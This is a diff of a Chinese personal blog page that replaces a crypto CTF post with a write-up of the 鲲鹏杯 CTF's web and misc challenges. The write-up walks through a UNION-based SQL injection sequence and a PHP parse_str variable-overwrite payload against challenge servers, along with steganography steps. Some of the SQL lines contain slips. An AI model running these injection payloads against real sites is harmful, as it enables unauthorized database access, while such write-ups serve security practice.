@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="攻防世界-新手-Crypto-8~9题, Lim_XuK">
+    <meta name="keywords" content="写写鲲鹏杯的WP吧。。, Lim_XuK">
     <meta name="description" content="晨光起于白塔尖顶，终将铺满阴霾之地。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>攻防世界-新手-Crypto-8~9题 | Lim_XuK</title>
+    <title>写写鲲鹏杯的WP吧。。 | Lim_XuK</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -204,12 +204,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/20.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">攻防世界-新手-Crypto-8~9题</h1>
+                    <h1 class="description center-align post-title">写写鲲鹏杯的WP吧。。</h1>
                 </div>
             </div>
         </div>
@@ -325,12 +325,16 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Crypto/">
-                                <span class="chip bg-color">Crypto</span>
+                            <a href="/tags/web/">
+                                <span class="chip bg-color">web</span>
                             </a>
                         
                             <a href="/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
                                 <span class="chip bg-color">做题记录</span>
+                            </a>
+                        
+                            <a href="/tags/misc/">
+                                <span class="chip bg-color">misc</span>
                             </a>
                         
                     </div>
@@ -354,7 +358,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-09-06
+                    2021-10-16
                 </div>
                 
 
@@ -378,169 +382,86 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="easy-RSA"><a class="header-anchor" href="#easy-RSA">¶</a>easy_RSA</h2>
+                <h2 id="前记"><a class="header-anchor" href="#前记">¶</a>前记</h2>
 <blockquote>
-<p>题目：<br>
-在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17<br>
-求解出d</p>
+<p>挺火的，本来进了决赛了，然后下午有另一个比赛耽误了，结果那个比赛TM的服务器人数过载了，进不去，早知道去打AWD了服了</p>
 </blockquote>
+<h2 id="WEB"><a class="header-anchor" href="#WEB">¶</a>WEB</h2>
+<h3 id="贪吃蛇"><a class="header-anchor" href="#贪吃蛇">¶</a>贪吃蛇</h3>
+<p>这玩意儿肯定不可能硬玩，一开始以为是前端玩游戏，然后把成绩转给后端，后端再判断成绩是否达标返回flag，结果开了半天bs抓不到包，所以判断应该是只有前端的JS进行判断，F12打开，查看JS代码，拖到中间发现有个判断函数，我记得大概是</p>
+<pre class="line-numbers language-none"><code class="language-none">if(Length&gt;2000)&#123;
+xxxxxxxxxxxxxxxxxx
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>xxxx里面是一堆颜表情，所以不难想到颜表情密码，直接把那一串拖进解码网站就可以得出答案</p>
+<h3 id="搜索引擎"><a class="header-anchor" href="#搜索引擎">¶</a>搜索引擎</h3>
+<p>就一个框，搜索，但是有返回，所以初步判断是SQL注入，接下来就是判断注入类型</p>
+<p>输入1’时，报错，所以判断是字符型输入，接下来就是一步步判断了</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">union</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span> <span class="token comment">#//没错</span>
+<span class="token keyword">union</span> <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">2</span> <span class="token comment">#//报错</span>
+<span class="token comment">//所以判断输出位只有一个</span>
+<span class="token keyword">union</span> <span class="token keyword">select</span> datebase<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//获取数据库名</span>
+<span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>SCHEMA_NAME<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">TABLES</span> <span class="token keyword">where</span> TABLE_SCHEMA<span class="token operator">=</span><span class="token string">'attackdb'</span><span class="token comment">//获取表名</span>
+<span class="token keyword">union</span>  <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_NAME<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> TABLE_SCHEMA<span class="token operator">=</span><span class="token string">'attackdb'</span> <span class="token operator">and</span> table_name<span class="token operator">=</span><span class="token string">'表名'</span><span class="token comment">//获取列名</span>
+<span class="token keyword">union</span> <span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token keyword">from</span> attackdb<span class="token punctuation">.</span>表名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>然后就能得到flag</p>
+<h3 id="php伪协议string-rot13的利用漏洞，php覆盖"><a class="header-anchor" href="#php伪协议string-rot13的利用漏洞，php覆盖">¶</a>php伪协议string.rot13的利用漏洞，php覆盖</h3>
+<p>这个确实不会，看别人博客慢慢学的</p>
+<p>点击信息时，URL发生变化，<code>index.php?page=index</code>，所以判断page是可以被赋值的，将page=index.php，查看源码内容，可以看到一串被注释的密文，根据题目提示判断是ROT13编码</p>
+<p>之后就去找rot13的解密，把那一串全部放进去，接下来就是代码审计</p>
+<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20211016151031.png" alt=""></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+    <span class="token variable">$hashed_key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'df01c5786c5d7d83211a8f5f22f6bdb8468e23494ad698cb86c02d128473beef765952cdd5504cbe4657a6334f6b4f7b'</span><span class="token punctuation">;</span>
+	
+	
+    <span class="token variable">$parsed</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token comment">//parse_url将url解析后，返回一个关联数组，数组中包含query这个字段，用来存储传入的参数值。</span>
+	
+    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token variable">$parsed</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"query"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//[query] => arg=value，将数组中的query字段值赋给变量query</span>
+	
+	
+    <span class="token variable">$parsed_query</span> <span class="token operator">=</span> <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token comment">//parse_str()  常见变量覆盖点</span>
+	<span class="token comment">//parse_str() 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量</span>
+	
+	
+	<span class="token comment">//所有通过url的get方法传入的参数都会经过parse_str方法。使传入的参数值覆盖之前赋的值，从而引发变量覆盖漏洞</span>
+	
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$parsed_query</span><span class="token operator">!=</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$parsed_query</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">===</span><span class="token string double-quoted-string">"auth"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      		 	 	 
+        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"key"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    	 	 	 
+        <span class="token variable">$hashed_input</span> <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'sha384'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//使用sha384的哈希算法，将key值进行hash运算，生成对应的哈希值 </span>
+        
+		
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$hashed_input</span><span class="token operator">!==</span><span class="token variable">$hashed_key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//hashed_input=hashed_key时，得到flag。</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no way to get flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+
+        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+		
+		<span class="token comment">//发现是php的变量覆盖，通过action间接覆盖其他的信息，所以构造覆盖action=auth，key=1，hashed_key=sha384的1</span>
+		
+    <span class="token punctuation">&#125;</span>
+        <span class="token delimiter important">?></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>接下来就是构造payload<br>
+index.php?action=auth&amp;key=1&amp;hashed_key=47f05d367b0c32e438fb63e6cf4a5f35c2aa2f90dc7543f8a41a0f95ce8a40a313ab5cf36134a2068c4c969cb50db776</p>
+<p>之后就能看到flag</p>
 <blockquote>
-<p>题目描述：没用，就硬做</p>
+<p>之后快结束的时候又发了两题，但是来不及看了QAQ</p>
 </blockquote>
-<h3 id="RSA介绍"><a class="header-anchor" href="#RSA介绍">¶</a>RSA介绍</h3>
-<blockquote>
-<p>前置知识储备：质数、互质、模反元素、欧拉函数、欧拉定理、费马小定理（欧拉特殊情况），具体后续在进行介绍</p>
-</blockquote>
-<table>
-<thead>
-<tr>
-<th>步骤</th>
-<th>说明</th>
-<th>描述</th>
-<th>备注</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>1</td>
-<td>找出质数</td>
-<td>P、Q</td>
-<td>-</td>
-</tr>
-<tr>
-<td>2</td>
-<td>计算公共模数</td>
-<td>N=P * Q</td>
-<td>-</td>
-</tr>
-<tr>
-<td>3</td>
-<td>欧拉函数</td>
-<td>φ(N) = (P-1)(Q-1)</td>
-<td>-</td>
-</tr>
-<tr>
-<td>4</td>
-<td>计算公钥E</td>
-<td>1 &lt; E &lt; φ(N)</td>
-<td>E的取值必须是整数<br>E 和 φ(N) 必须是互质数</td>
-</tr>
-<tr>
-<td>5</td>
-<td>计算私钥D</td>
-<td>E * D % φ(N) = 1</td>
-<td>-</td>
-</tr>
-<tr>
-<td>6</td>
-<td>加密</td>
-<td>C = M<sup>E</sup> mod N</td>
-<td>C：密文 M：明文</td>
-</tr>
-<tr>
-<td>7</td>
-<td>解密</td>
-<td>M = C<sup>D</sup> mod N</td>
-<td>C：密文 M：明文</td>
-</tr>
-</tbody>
-</table>
-<p>公钥＝(E , N)<br>
-私钥＝(D, N)<br>
-对外，我们只暴露公钥。</p>
-<h3 id="解题步骤"><a class="header-anchor" href="#解题步骤">¶</a>解题步骤</h3>
-<p>由于本题数值太大，不方便使用上述方法手算，所以考虑使用python代码</p>
-<p>编写python：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2 
-
-p <span class="token operator">=</span> <span class="token number">473398607161</span> 
-q <span class="token operator">=</span> <span class="token number">4511491</span> 
-e <span class="token operator">=</span> <span class="token number">17</span> 
-phi <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> 
-d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span> phi<span class="token punctuation">)</span>  <span class="token comment">##求逆元，d^e = 1 mod phi</span>
-
-<span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>得出结果：<strong>125631357777427553</strong></p>
-<h2 id="easychallenge"><a class="header-anchor" href="#easychallenge">¶</a>easychallenge</h2>
-<blockquote>
-<p>题目： 一个.pyc文件</p>
-</blockquote>
-<blockquote>
-<p>题目描述： 没有意义的一串文字</p>
-</blockquote>
-<p>因为没有任何提示，所以走一步看一步</p>
-<h3 id="解题步骤-v2"><a class="header-anchor" href="#解题步骤-v2">¶</a>解题步骤</h3>
-<ol>
-<li>.pyc为.py的编译过后的文件，所以我们需要对.pyc文件进行反编译，得到原文</li>
-</ol>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
-
-<span class="token keyword">def</span> <span class="token function">encode1</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    s <span class="token operator">=</span> <span class="token string">''</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> ans<span class="token punctuation">:</span>
-        x <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">36</span>
-        x <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">25</span>
-        s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
-    
-    <span class="token keyword">return</span> s
-
-
-<span class="token keyword">def</span> <span class="token function">encode2</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    s <span class="token operator">=</span> <span class="token string">''</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> ans<span class="token punctuation">:</span>
-        x <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">36</span>
-        x <span class="token operator">=</span> x <span class="token operator">^</span> <span class="token number">36</span>
-        s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
-    
-    <span class="token keyword">return</span> s
-
-
-<span class="token keyword">def</span> <span class="token function">encode3</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b32encode<span class="token punctuation">(</span>ans<span class="token punctuation">)</span>
-
-flag <span class="token operator">=</span> <span class="token string">' '</span>
-<span class="token keyword">print</span> <span class="token string">'Please Input your flag:'</span>
-flag <span class="token operator">=</span> <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-final <span class="token operator">=</span> <span class="token string">'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='</span>
-<span class="token keyword">if</span> encode3<span class="token punctuation">(</span>encode2<span class="token punctuation">(</span>encode1<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> final<span class="token punctuation">:</span>
-    <span class="token keyword">print</span> <span class="token string">'correct'</span>
-<span class="token keyword">else</span><span class="token punctuation">:</span>
-    <span class="token keyword">print</span> <span class="token string">'wrong'</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>由题目不难看出，这个文件给出了<strong>final</strong>，需要通过<strong>final</strong>逆推出本题的<strong>flag</strong></p>
-<ol start="2">
-<li>修改代码顺序，加密过程<strong>上下顺序颠倒，运算逆置，加密解密顺序逆置</strong>，得到代码如下：</li>
-</ol>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
-
-<span class="token keyword">def</span> <span class="token function">encode1</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    s <span class="token operator">=</span> <span class="token string">''</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> ans<span class="token punctuation">:</span>
-        x <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">25</span>
-        x <span class="token operator">=</span> x <span class="token operator">^</span> <span class="token number">36</span>  <span class="token comment"># ^为异或运算，异或运算的逆运算还是异或运算</span>
-        s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
-    
-    <span class="token keyword">return</span> s
-
-
-<span class="token keyword">def</span> <span class="token function">encode2</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    s <span class="token operator">=</span> <span class="token string">''</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> ans<span class="token punctuation">:</span>
-        x <span class="token operator">=</span> i <span class="token operator">^</span> <span class="token number">36</span> <span class="token comment">#ord()这个函数接受的类型是一个长度为1的字符串，而在python3当中传入的i已经是一个整型数了，直接用i^36就可以完成操作</span>
-        x <span class="token operator">=</span> x <span class="token operator">-</span> <span class="token number">36</span>
-        s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>
-    
-    <span class="token keyword">return</span> s
-
-
-<span class="token keyword">def</span> <span class="token function">encode3</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>
-    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b32decode <span class="token punctuation">(</span>ans<span class="token punctuation">)</span>  <span class="token comment">#用 Base32 编码字节类对象（bytes-like object）ans，并返回编码过的字节（bytes），encode为加密，decode为解密</span>
-
-flag <span class="token operator">=</span> <span class="token string">' '</span>
-final <span class="token operator">=</span> <span class="token string">'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='</span>
-flag <span class="token operator">=</span> encode1<span class="token punctuation">(</span>encode2<span class="token punctuation">(</span>encode3<span class="token punctuation">(</span>final<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>得出结果：<strong>cyberpeace{interestinghhhhh}</strong></p>
+<h2 id="MISC"><a class="header-anchor" href="#MISC">¶</a>MISC</h2>
+<h3 id="Base64转图片"><a class="header-anchor" href="#Base64转图片">¶</a>Base64转图片</h3>
+<p>记得没错的话，题目用010打开后，应该是一串Base64编码，然后把它都进Base64转图片里面，就会生成一个二维码，那个二维码扫完就是一个base64加密的字符串，再解码就好了</p>
+<h3 id="真正的ctfer"><a class="header-anchor" href="#真正的ctfer">¶</a>真正的ctfer</h3>
+<p>这题我有见过，但是因为没有软件不太会操作=-=</p>
+<h3 id="Who-won-the-game"><a class="header-anchor" href="#Who-won-the-game">¶</a>Who_won_the_game</h3>
+<p>丢010，发现里面有个flag.txt，所以这玩意儿应该不是png，把他改成zip后缀，发现里面有个flag.txt和一个加密的gif图片，爆破得知密码为1020，把他丢到Stegsolve里面，一步步去找。</p>
+<p>然后在后面几张图里面找到了这个</p>
+<p><img src="https://raw.githubusercontent.com/Lim135/picpicgo/master/img/20211016153713.png" alt=""></p>
+<p>一个个图片属性去换，发现在gray bits中有一个二维码，扫一下就得到flag</p>
 
                 
             </div>
@@ -567,7 +488,7 @@ flag <span class="token operator">=</span> encode1<span class="token punctuation
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://Lim135.github.io/2021/09/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E6%96%B0%E6%89%8B-Crypto-8-9%E9%A2%98/">http://Lim135.github.io/2021/09/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E6%96%B0%E6%89%8B-Crypto-8-9%E9%A2%98/</a>
+                    <a href="http://Lim135.github.io/2021/10/16/%E5%86%99%E5%86%99%E9%B2%B2%E9%B9%8F%E6%9D%AF%E7%9A%84WP%E5%90%A7%E3%80%82%E3%80%82/">http://Lim135.github.io/2021/10/16/%E5%86%99%E5%86%99%E9%B2%B2%E9%B9%8F%E6%9D%AF%E7%9A%84WP%E5%90%A7%E3%80%82%E3%80%82/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -605,12 +526,16 @@ flag <span class="token operator">=</span> encode1<span class="token punctuation
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/Crypto/">
-                                    <span class="chip bg-color">Crypto</span>
+                                <a href="/tags/web/">
+                                    <span class="chip bg-color">web</span>
                                 </a>
                             
                                 <a href="/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
                                     <span class="chip bg-color">做题记录</span>
+                                </a>
+                            
+                                <a href="/tags/misc/">
+                                    <span class="chip bg-color">misc</span>
                                 </a>
                             
                         </div>
@@ -656,29 +581,30 @@ flag <span class="token operator">=</span> encode1<span class="token punctuation
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/09/07/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E6%96%B0%E6%89%8B-Crypto-10/">
+                <a href="/2021/10/16/%E5%86%99%E5%86%99%E9%B2%B2%E9%B9%8F%E6%9D%AF%E7%9A%84WP%E5%90%A7%E3%80%82%E3%80%82/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="攻防世界-新手-Crypto-10">
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="写写鲲鹏杯的WP吧。。">
                         
-                        <span class="card-title">攻防世界-新手-Crypto-10</span>
+                        <span class="card-title">写写鲲鹏杯的WP吧。。</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            说着难度高，其实硬做还好
+                            学学学
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-09-07
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-16
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -691,15 +617,20 @@ flag <span class="token operator">=</span> encode1<span class="token punctuation
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Crypto/">
-                        <span class="chip bg-color">Crypto</span>
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
                     </a>
                     
                     <a href="/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
                         <span class="chip bg-color">做题记录</span>
+                    </a>
+                    
+                    <a href="/tags/misc/">
+                        <span class="chip bg-color">misc</span>
                     </a>
                     
                 </div>
@@ -713,24 +644,24 @@ flag <span class="token operator">=</span> encode1<span class="token punctuation
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/09/06/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-%E6%96%B0%E6%89%8B-Crypto-6-7%E9%A2%98/">
+                <a href="/2021/10/14/%E4%B8%80%E4%BA%9B%E4%BA%9Bweb%E7%9A%84%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95%E2%80%94%E2%80%94%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="攻防世界-新手-Crypto-6~7题">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="一些些web的做题记录——持续更新">
                         
-                        <span class="card-title">攻防世界-新手-Crypto-6~7题</span>
+                        <span class="card-title">一些些web的做题记录——持续更新</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            开始出现多重加密，不过也都是基于对密码形式的熟悉而得出的解密方法
+                            边看边做
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-06
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-10-14
                             </span>
                         <span class="publish-author">
                             
@@ -747,12 +678,16 @@ flag <span class="token operator">=</span> encode1<span class="token punctuation
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Crypto/">
-                        <span class="chip bg-color">Crypto</span>
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
                     </a>
                     
                     <a href="/tags/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">
                         <span class="chip bg-color">做题记录</span>
+                    </a>
+                    
+                    <a href="/tags/misc/">
+                        <span class="chip bg-color">misc</span>
                     </a>
                     
                 </div>
